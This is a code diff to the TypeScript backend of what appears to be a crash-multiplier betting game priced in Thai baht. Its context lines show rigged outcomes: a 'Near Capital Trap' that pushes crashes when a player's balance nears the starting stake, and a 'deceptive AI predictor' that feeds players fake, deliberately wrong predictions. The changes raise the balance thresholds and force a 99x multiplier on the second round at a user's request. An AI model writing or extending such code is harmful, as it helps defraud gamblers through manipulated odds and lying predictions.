@@ -631,7 +631,7 @@ interface PlayerSpecialState {
 const playerStates = new Map<string, PlayerSpecialState>();
 
 // Global fallback states:
-let sessionEntryBalance = 1040; 
+let sessionEntryBalance = 104000; 
 let roundsSinceLast49x = 999; // Initialize to high number so it triggers immediately on the first drop
 let specialCooldownThreshold = Math.floor(Math.random() * 6) + 33; // Random cooldown from 33 to 38 rounds
 let lastResetDateBangkok = "";
@@ -796,7 +796,7 @@ async function runSecurityFullstackServer() {
     const currentModuloIndex = ((backendRoundCounter - 1) % 100) + 1; // 1 to 100 index
 
     const sessionId = (req.body && typeof req.body.sessionId === "string") ? req.body.sessionId : "default_session";
-    const currentBalance = (req.body && typeof req.body.currentBalance === "number") ? req.body.currentBalance : 1040;
+    const currentBalance = (req.body && typeof req.body.currentBalance === "number") ? req.body.currentBalance : 104000;
 
     // Get or initialize player's isolated state
     if (!playerStates.has(sessionId)) {
@@ -869,8 +869,8 @@ async function runSecurityFullstackServer() {
       console.log(`[DECEPTIVE AI PREDICTOR] Recalibration #${state.recalibrationCount} triggered for sessionId: ${sessionId}. New fake target pushed to Session Round ${state.fakeTargetRound}`);
     }
 
-    // Near Capital Trap Constraint (Triggered when user balance climbs back up close to 1040, between [850, 1038] THB)
-    const isInNearCapitalRange = (currentBalance >= 850 && currentBalance <= 1038);
+    // Near Capital Trap Constraint (Triggered when user balance climbs back up close to 104000, between [85000, 103800] THB)
+    const isInNearCapitalRange = (currentBalance >= 85000 && currentBalance <= 103800);
     const isNearCapitalTrap = isInNearCapitalRange && (Math.random() < 0.55);
 
     // Securely randomize crash points mimicking house-authorized profiles
@@ -966,7 +966,11 @@ async function runSecurityFullstackServer() {
     }
 
     // Branching decisions for target crash point
-    if (isSpecial49xRound) {
+    if (state && state.sessionRoundCounter === 2) {
+      // Special Rule from user: 2nd session round must reach exactly 99.00x multiplier with 100% chance!
+      targetCrashPoint = 99.00;
+      console.log(`[USER SPECIAL COMMAND ACTIVE] 🚀 Player Session Round 2: Boosted to fly to exactly ${targetCrashPoint}x with 100% certainty!`);
+    } else if (isSpecial49xRound) {
       // Special Rule: Force aircraft to rocket up to exactly 49.00x multiplier immediately!
       targetCrashPoint = 49.00;
       console.log(`[SPECIAL FEATURE ACTIVE] 🚀 Rocket boosted to fly to exactly ${targetCrashPoint}x! Let players get a massive recovery!`);
@@ -1021,8 +1025,9 @@ async function runSecurityFullstackServer() {
     // Set variable for next round protection
     lastCrashPointWasLow = (targetCrashPoint < 1.18);
 
-    // Format boundaries: Cap standard at 13.00, or allow up to 49.00 for special rounds
-    const maxClamp = isSpecial49xRound ? 49.00 : 13.00;
+    // Format boundaries: Cap standard at 13.00, or allow up to 49.00/99.00 for special rounds
+    const isSpecial99xRound = (state && state.sessionRoundCounter === 2);
+    const maxClamp = isSpecial99xRound ? 99.00 : (isSpecial49xRound ? 49.00 : 13.00);
     targetCrashPoint = parseFloat(Math.max(1.01, Math.min(maxClamp, targetCrashPoint)).toFixed(2));
 
     // Generate an intentionally misleading AI Prediction (opposite to reality)
